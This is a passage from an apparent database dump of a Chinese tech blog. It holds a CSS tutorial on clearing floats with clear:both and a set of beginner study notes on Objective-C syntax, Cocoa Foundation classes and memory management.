/>\r\n该属性的值指出了不允许有浮动对象的边情况，又对象左边不允许有浮动、右边不允许有浮动、不允许有浮动对象。</p>\r\n\r\n<p><strong>4、css结构</strong><br />\r\ndiv{clear:left}<br />\r\ndiv{clear:right}<br />\r\ndiv{clear:both}</p>\r\n\r\n<p>二、div clear常用地方 &nbsp; - &nbsp;&nbsp;TOP</p>\r\n\r\n<p>我们常常用于使用了float css样式后产生浮动，最常用是使用clear:both清除浮动。比如一个大对象内有2个小对象使用了css float样式为了避免产生浮动，大对象背景或边框不能正确显示，这个时候我们就需要clear:both清除浮动。</p>\r\n\r\n<p>三、css+div案例 &nbsp; - &nbsp;&nbsp;TOP</p>\r\n\r\n<p>DIVCSS5案例说明：这里设置一个css宽度（css width）为500px;盒子，css边框（css border）为红色，css背景（css background）为黑色、css padding为10px盒子，里面包裹着2个小盒子，一个css 浮动靠右（float:right）、一个css float靠左（float:left）,两者边框为白色，背景颜色为灰色,宽度为200px,css高度(css height)为150px。这样我们来观察案例效果，看浮动产生并使用clear清除浮动。</p>\r\n\r\n<p><strong>1、案例css代码：</strong></p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ol>\r\n	<li>.divcss5{width:500px;background:#000;border:1px&nbsp;solid&nbsp;#F00;padding:10px}&nbsp;</li>\r\n	<li><span style=\"background-color:inherit; color:black\">.divcss5_left,.divcss5_right{&nbsp;</span></li>\r\n	<li>border:1px&nbsp;solid&nbsp;#FFF;background:#999;width:200px;height:150px&nbsp;</li>\r\n	<li><span style=\"background-color:inherit; color:black\">}&nbsp;</span></li>\r\n	<li>/*&nbsp;css注释：&nbsp;这里为了截图分别，对css代码换行&nbsp;*/&nbsp;</li>\r\n	<li><span style=\"background-color:inherit; color:black\">.divcss5_left{&nbsp;float:left}/*&nbsp;css注释：&nbsp;设置浮动靠左&nbsp;*/&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">.divcss5_right{&nbsp;float:right}/*&nbsp;css注释：设置浮动靠右&nbsp;*/&nbsp;</span></li>\r\n</ol>\r\n\r\n<p><strong>2、案例html代码片段：</strong></p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ol>\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit\">&nbsp;</span><span style=\"background-color:inherit; color:red\">class</span><span style=\"background-color:inherit\">=</span><span style=\"background-color:inherit; color:blue\">&quot;divcss5&quot;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit\">&nbsp;</span><span style=\"background-color:inherit; color:red\">class</span><span style=\"background-color:inherit\">=</span><span style=\"background-color:inherit; color:blue\">&quot;divcss5_left&quot;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">float&nbsp;left盒子</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;/</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit\">&nbsp;</span><span style=\"background-color:inherit; color:red\">class</span><span style=\"background-color:inherit\">=</span><span style=\"background-color:inherit; color:blue\">&quot;divcss5_right&quot;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">float&nbsp;right盒子</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;/</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;/</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><strong>3、案例效果截图</strong></p>\r\n\r\n<p style=\"text-align:center\"><img alt=\"float浮动产生与清除案例截图\" src=\"http://www.divcss5.com/uploads/allimg/130305/1_130305160943_1.png\" style=\"border:0px; cursor:pointer; max-width:930px; vertical-align:middle\" /><br />\r\ncss div浮动产生与清除案例截图</p>\r\n\r\n<p>这个时候需要clear来清除浮动，让css命名为&ldquo;divcss5&rdquo;盒子撑开。</p>\r\n\r\n<p><strong>4、清除浮动方法</strong></p>\r\n\r\n<p><strong>我们在css代码中加入CSS代码：</strong></p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ol>\r\n	<li><span style=\"background-color:inherit; color:black\">.clear{&nbsp;clear:both}&nbsp;</span></li>\r\n</ol>\r\n\r\n<p><strong>Html代码中&ldquo;.divcss5&rdquo;盒子</strong><strong>&lt;/div&gt;</strong><strong>结束标签前加入代码：</strong></p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ol>\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit\">&nbsp;</span><span style=\"background-color:inherit; color:red\">class</span><span style=\"background-color:inherit\">=</span><span style=\"background-color:inherit; color:blue\">&quot;clear&quot;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&lt;/</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">div</span><span style=\"background-color:inherit; color:rgb(0, 51, 255)\">&gt;</span><span style=\"background-color:inherit\">&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p>最终使用div css&nbsp;clear清除浮动后应用用法案例截图</p>\r\n\r\n<p style=\"text-align:center\"><img alt=\"使用clear清除浮动案例截图图文分析\" src=\"http://www.divcss5.com/uploads/allimg/130305/1_130305161106_1.png\" style=\"border:0px; cursor:pointer; max-width:930px; vertical-align:middle\" /><br />\r\nClear使用用法案例截图</p>\r\n\r\n<p><span style=\"color:rgb(255, 0, 0)\">扩展阅读</span>：CSS清除float浮动技巧&nbsp;http://www.divcss5.com/jiqiao/j406.shtml</p>\r\n\r\n<p>四、DIVCSS5总结 &nbsp; - &nbsp;&nbsp;TOP</p>\r\n\r\n<p>使用clear可以清除float产生的浮动，注意clear样式对象加入位置，如上案例对&ldquo;.divcss5&rdquo;清除浮动，我们就只需要在此对象div标签结束前加入即可清除内部小盒子产生浮动。而一般常用clear:both来清除浮动，其它clear:left和clear:right可以下来根据clear both案例扩展学习实践。</p>\r\n',0,0,'CSS clear both清除浮动',98,NULL,0),(66,0,'20150715212438',2,'<p><strong>提纲：</strong></p>\r\n\r\n<p>简介</p>\r\n\r\n<p>与C语言相比要注意的地方</p>\r\n\r\n<p>objective-c高级特性</p>\r\n\r\n<p>开发工具介绍(cocoa&nbsp;工具包的功能，框架，源文件组织；XCode使用介绍)</p>\r\n\r\n<p><strong>简介：</strong></p>\r\n\r\n<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;objective-c是C语言的一个扩展集，主要由APPLE公司维护，是MAC系统下的主要开发语言。</p>\r\n\r\n<p>个人认为，对于用惯了常用的C,JAVA等语言的人来说，objective-c是一中很另类，非主流的语言。</p>\r\n\r\n<p>2.&nbsp;&nbsp;&nbsp;&nbsp;开发&nbsp;Mac的&nbsp;UI&nbsp;程序来说，使用的是&nbsp;Cocoa&nbsp;这个框架，cocoa的组成部分有：foundation和application kit框架。</p>\r\n\r\n<p>【foundation框架处理用户界面之下的特性，如数据结构和通信机制；application kit框架包含cocoa的高级特性：用户界面元素，打印，颜色，声音管理，applescript等】</p>\r\n\r\n<p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我通过这本书的学习：</p>\r\n\r\n<p>基本掌握了Objective C的语法，基本能看懂别人写的代码，自己也能编写代码；</p>\r\n\r\n<p>熟悉了开发环境XCode的使用；（包括建立项目，调试，运行，代码管理等）</p>\r\n\r\n<p><strong>与C</strong><strong>语言相比要注意的地方：</strong></p>\r\n\r\n<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件介绍：Objective-C&nbsp;也使用头文件(header files)，后缀为&nbsp;.h,&nbsp;但使用&nbsp;.m（即&nbsp;message,&nbsp;其他面向对象编程语言也叫&nbsp;method），作为源文件的后缀。</p>\r\n\r\n<p>在objective-c中使用＃import&lt;&gt;,而不使用＃include&lt;&gt;，＃import可以保证头文件只被包含一次。</p>\r\n\r\n<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与C一致的地方：</p>\r\n\r\n<p>数据类型，表达式，各种运算符</p>\r\n\r\n<p>循环：for, while, do while, break, continue</p>\r\n\r\n<p>分支：if, else, switch</p>\r\n\r\n<p>3.&nbsp;&nbsp;&nbsp;&nbsp;NSlog()函数：与printf()类似，想控制台输出信息。但它增加了一些特性，如时间戳等。</p>\r\n\r\n<p>【cocoa对起所有的函数，常量和类型名称都添加了NS前缀。】</p>\r\n\r\n<p>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;双引号的前面的@表示这双引号中的字符串应该作为cocoa的NSString元素来处理。</p>\r\n\r\n<p>5.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;布尔类型BOOL:值为YES,NO;</p>\r\n\r\n<p>6.&nbsp;&nbsp;&nbsp;&nbsp;%d表示输出整数</p>\r\n\r\n<p>&nbsp;&nbsp;％@表示输出NSString类型</p>\r\n\r\n<p>%s表示输出字符串数组（char*）;</p>\r\n\r\n<p>7.&nbsp;&nbsp;&nbsp;&nbsp;objective-c中的方括号：</p>\r\n\r\n<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于通知某个对象该做什么。</p>\r\n\r\n<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方括号内第一项是对象，其余部分是你需要对象执行的操作。</p>\r\n\r\n<p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在objective-c中通知对象执行某种操作，称为<strong>发送消息</strong>。（也叫调用方法）</p>\r\n\r\n<p>8.&nbsp;标识符id:是一种泛型，用于表示任何种类的对象。</p>\r\n\r\n<p>9.&nbsp;类声明@interface：</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>@interface Circle:NSObject&nbsp;&nbsp; //为Circle类定义接口；NSObject表示是父类。</p>\r\n\r\n			<p>{//以下是数据成员</p>\r\n\r\n			<p>&nbsp;&nbsp; ShapeColor fillColor;</p>\r\n\r\n			<p>&nbsp;&nbsp; ShapeRect bounds;</p>\r\n\r\n			<p>}</p>\r\n\r\n			<p>//以下是方法声明</p>\r\n\r\n			<p>-(void) setFillColor: (ShapeColor) fillColor;&nbsp; //前面的短线表明这是方法声明</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //短线后面是方法的返回类型</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //接着是方法名</p>\r\n\r\n			<p>//冒号后面是参数，其中(ShapeColor)是参数类型，</p>\r\n\r\n			<p>fillColor是参数名</p>\r\n\r\n			<p>-(void) setBounds:(ShapeRect) bounds;</p>\r\n\r\n			<p>-(void) draw;</p>\r\n\r\n			<p>&nbsp;//减号就是普通函数</p>\r\n\r\n			<p>加号就是静态函数</p>\r\n\r\n			<p>@end&nbsp;&nbsp;&nbsp;&nbsp; //结束声明</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>objective-c看到@符号，就把它看成是C语言的扩展。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><strong>一个类的完整声明如下：</strong></p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;@interface CClassA(Category): CBaseClass&lt;IA,IB...&gt;</p>\r\n\r\n			<p>//类名（类别名）：父类&lt;协议&gt;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>10.&nbsp;类实现@implementation</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>@implementation</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>@implementation Circle</p>\r\n\r\n			<p>-(void) setFillColor: (ShapeColor) c</p>\r\n\r\n			<p>{</p>\r\n\r\n			<p>&nbsp;&nbsp; fillColor=c;</p>\r\n\r\n			<p>}</p>\r\n\r\n			<p>-(void) draw</p>\r\n\r\n			<p>{</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp; NSLog(@&rdquo;drawing a circle at(%d %d %d %d) in %@&rdquo;, bounds.x,bounds.y,bounds.width,bounds.height,colorName(fillName));</p>\r\n\r\n			<p>}</p>\r\n\r\n			<p>@end</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>隐藏对象self对应于C中的this。</p>\r\n\r\n			<p>Self-&gt;fillcolor来访问成员变量。</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>11.&nbsp;调用写好的类和类函数：</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>//创建新对象，使用缺省初始化函数</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;Bank *bankDefault = [[Bank alloc] init];</p>\r\n\r\n			<p>//调用方法：</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;[bank addAmount: 1];</p>\r\n\r\n			<p>[bank print];</p>\r\n\r\n			<p>//&nbsp;释放对象：</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;[bankDefault free];</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>12.</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>两个参数的方法：</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>-(void) setTire: (Tire *) tire&nbsp; //声明</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; atIndex: (int) index;</p>\r\n\r\n			<p>//使用</p>\r\n\r\n			<p>[car setTire:tire&nbsp;atIndex:2];</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>objective-c</strong><strong>高级特性：</strong></p>\r\n\r\n<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;继承</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>Objective-c不支持多继承。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>Super&nbsp;关键字：调用该类的父类；</p>\r\n\r\n			<p>超类：父类的另一种说法。<strong>&nbsp;</strong></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>自定义NSLog()输出:</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>在类中添加description方法就可以自定义NSLog()如何输出对象。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>@implementation Tire</p>\r\n\r\n			<p>-(NSString *) description</p>\r\n\r\n			<p>{</p>\r\n\r\n			<p>&nbsp;&nbsp; Return (@&rdquo;I am a tire.&rdquo;);</p>\r\n\r\n			<p>}</p>\r\n\r\n			<p>Main()</p>\r\n\r\n			<p>{</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp; NSLog(@&rdquo;%@&rdquo;,tire[0]);</p>\r\n\r\n			<p>}</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p><strong>Foundation kit:</strong></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>Cocoa是由两部分框架组成的：foundation kit [包括一些基础类]和&nbsp;application kit.【包括用户接口对象和高级类】</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>&nbsp;创建字符串：</p>\r\n\r\n			<p>NSString *test;</p>\r\n\r\n			<p>test=[NSString stringWithFormat:@&quot;i&#39;m %d years old!&quot;,23];</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>若在声明方法时在方法前面添加了加号，那就表示把这个方法定义为类方法【这个方法属于类对象，而不是类的实例对象。】</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>NSArray类：可以存放任意类型的对象.</p>\r\n\r\n			<p>它有两个限制：</p>\r\n\r\n			<p>1.&nbsp;它只能存储objective-c的对象，但不能存储C中的基本数据类型，如int , float, enum, struct等。</p>\r\n\r\n			<p>2.不能存储nil(对象的零值或NULL值)；【因为在创建NSArray时，要在列表结尾添加nil代表列表结束。】&nbsp;</p>\r\n\r\n			<p>创建NSArray：</p>\r\n\r\n			<p>NSArray *array;</p>\r\n\r\n			<p>array=[NSArray arrayWithObjects:@&quot;one&quot;,@&quot;two&quot;,nil];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>NSString, NSMutableString类；</p>\r\n\r\n			<p>【NSString是不可变的，即一旦创建完成，就不能通过删除字符或添加字符的方式来改变它；</p>\r\n\r\n			<p>而NSMutableString是可变的。</p>\r\n\r\n			<p>这两个类就像JAVA中的string与stringBuffer类的区别。】</p>\r\n\r\n			<p>NSArray, NSMutableArray类；</p>\r\n\r\n			<p>NSEnumerator枚举；</p>\r\n\r\n			<p>【</p>\r\n\r\n			<p>NSEnumerator *emun;</p>\r\n\r\n			<p>Emun=[array objectEnumerator];</p>\r\n\r\n			<p>Id thingie;</p>\r\n\r\n			<p>While(thingie=[enumerator nextObject]){}</p>\r\n\r\n			<p>】</p>\r\n\r\n			<p>NSDictionary:字典（关键字及其定义的集合。）【也成为散列表，关联数组】，NSMutableDictionary类；</p>\r\n\r\n			<p>NSNumber:用来包装基本数据类型，如int ,char, float, bool;【将一个基本类型的数据包装成对象叫做装箱。】</p>\r\n\r\n			<p>NSValue:它可以包装任何类，NSNumber是它的子类。</p>\r\n\r\n			<p>NSNull:</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>&nbsp;在cocoa中看到&ldquo;CF&rdquo;字样时，就表示它是苹果公司的Core Foundation&nbsp;框架相关的内容。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>&nbsp;NSAutoreleasePool:自动释放内存池。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>内存管理</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>每个对象都有一个与之关联的引用计数（也叫保留计数）</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>当使用alloc, new&nbsp;方法或通过&nbsp;copy消息（生成接收对象的一个副本）创建一个对象时，对象的引用计数值被设为1；</p>\r\n\r\n			<p>&nbsp;给对象发retain消息时，增加该值；</p>\r\n\r\n			<p>&nbsp;发送release消息时，减少该值；</p>\r\n\r\n			<p>当一个对象的引用计数值变为0时，objective-c会自动向对象发送一条dealloc消息。销毁该对象。</p>\r\n\r\n			<p>你可以在自己的对象中重写该方法，</p>\r\n\r\n			<p>使用retainCount消息，可以获取引用计数器的值。</p>\r\n\r\n			<p>-(id) retain;</p>\r\n\r\n			<p>-(void) release;</p>\r\n\r\n			<p>-(unsigned) retainCount;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>自动释放池：autorelease pool;</p>\r\n\r\n			<p>创建：</p>\r\n\r\n			<p>NSAutoreleasePool *pool;</p>\r\n\r\n			<p>pool=[[NSAutoreleasePool alloc] init];</p>\r\n\r\n			<p>销毁：</p>\r\n\r\n			<p>[pool release];</p>\r\n\r\n			<p>注意：xcode自动生成的代码，销毁pool池时，使用的是[pool drain],drain方法只是清空释放池，但不销毁pool.所以在自己编写代码时还是使用release.</p>\r\n\r\n			<p>而且，drain只适用于MAC OS 10.4以上的版本，而release适用于所有版本。</p>\r\n\r\n			<p>只有在向某个对象发送autorelease消息时，该对象才会添加到NSAutoreleasepool中，才会被自动释放。</p>\r\n\r\n			<p>如：[car autorelease];</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><strong>内存管理黄金准则：</strong><strong>&nbsp;</strong></p>\r\n\r\n			<p>只有通过alloc, new和&nbsp;copy方法创建的对象，才需要程序员负责向该对象发送release或autorelease消息。</p>\r\n\r\n			<p>而通过其他方法获得的对象，则默认为已经被设置为自动释放，所以不需要程序员做任何操作了。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>在objective-c 2.0中有垃圾回收机制，</p>\r\n\r\n			<p>如果要对某个项目使用垃圾回收：</p>\r\n\r\n			<p>项目信息--build选项卡--查询&quot;garb&quot;,出现&ldquo;objective-c Garbage Collection&rdquo;,将其值设置为&ldquo;required[-fobjc-gc-only]&rdquo;</p>\r\n\r\n			<p>启用垃圾回收后，通常的内存管理命令全都变成了空操作指令，不执行任何操作。</p>\r\n\r\n			<p>开发iphone软件，不能使用垃圾回收。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>5.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>对象初始化</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>两种创建新对象的方法：</p>\r\n\r\n			<p>[类名&nbsp;new]</p>\r\n\r\n			<p>[[类名&nbsp;alloc] init]</p>\r\n\r\n			<p>这两种方法是等价的，但cocoa的惯例是使用后者。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>alloc在为对象分配空间的同时，将这块内存初始化为0；</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>Init方法：初始化实例变量，使对象处于可用状态。[返回类型为id,&nbsp;&nbsp;返回的值描述了被初始化的对象]</p>\r\n\r\n			<p>使用new创建新对象时，系统要完成两个步骤：</p>\r\n\r\n			<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为对象分配内存，即对象获得一个用来存放其实例变量的内存块；</p>\r\n\r\n			<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自动调用init方法，让该对象处于可用状态。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>6.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>objective-c 2.0的新特性【只适用于mac os x10.5及以上】</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>@property :表示声明了对象的属性。【这样就不用再写属性的访问器了。】</p>\r\n\r\n			<p>（他有copy, retain, readwrite, readonly等属性）</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>@synthesize:表示&ldquo;创建该属性的访问器&rdquo;</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>点表达式</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>7.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border-spacing:0px; border:1px solid silver; margin:0px; padding:0px; width:90%; word-break:break-word\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>类别</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>类别（category）是一种为现有的类添加新方法的方式。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>类别的声明：</p>\r\n\r\n			<p>@interface NSString (NumberConvenience) //类名&nbsp;（类别名）</p>\r\n\r\n			<p>-(NSNumber) lengthAsNumber;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//扩充方法声明</p>\r\n\r\n			<p>@end</p>\r\n\r\n			<p>使用时使用原来的类名，就可以调用他的所有类别中的方法。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>类别的局限性：</p>\r\n\r\n			<p>1.&nbsp;&nbsp;&nbsp;&nbsp;不能向类中添加新的实例变量；</p>\r\n\r\n			<p>2.&nbsp;&nbsp;&nbsp;&nbsp;在类别中的方法若与类中现有的方法重名，则类中的方法不可用，被类别中的新方法取代。</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p>类别的作用：</p>\r\n\r\n			